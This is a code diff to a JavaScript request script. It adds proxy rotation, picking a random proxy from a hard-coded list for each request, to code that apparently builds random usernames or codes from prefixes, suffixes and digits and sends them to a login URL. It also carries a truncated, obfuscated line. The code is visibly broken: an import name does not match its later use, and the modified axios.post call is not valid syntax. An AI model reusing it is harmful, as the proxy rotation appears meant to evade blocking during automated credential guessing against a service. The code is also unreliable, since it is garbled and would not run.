@@ -1,4 +1,5 @@
 //fc6de=a0_0x31a8,_0x3b7875=_0x394090();while(!![]){try{consmt _0x2314b2=parseInt(_0x4fc6de(0x127))/0x1+-parseInt(_0x4fc6de(0x121))/0x2*(-pars
+import tpsProxyAgent from 'https-proxy-agent';
 import axios from "axios";
 import { loadConfig } from "./config.js"
 import { url, logout_url, method,headers,randomPartLength,digits,prefix,suffix } from "./variables.js";
@@ -12,6 +13,12 @@ export async function checkServerConnection() {
         return false;
     }
 }
+const proxies = [
+  'http://192.168.1.100:8080',
+  'http://192.168.1.101:8080',
+  'http://192.168.1.102:8080'
+  // أضف المزيد
+];
 
 export function Wait() {
 
@@ -64,8 +71,10 @@ export
         var: 'callBack',
         verfiy: false, timeout: 500
     });
+const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+  const agent = new HttpsProxyAgent(proxy);
     if (method === "POST") {
-        return await axios.post(url, data, headers);
+        return await axios.post(url,httpsAgent:agent ,data, headers);
     } else if (method === "GET") {
         config.params = { username, verify: 'callBack' };
         return await axios.get(url, headers);
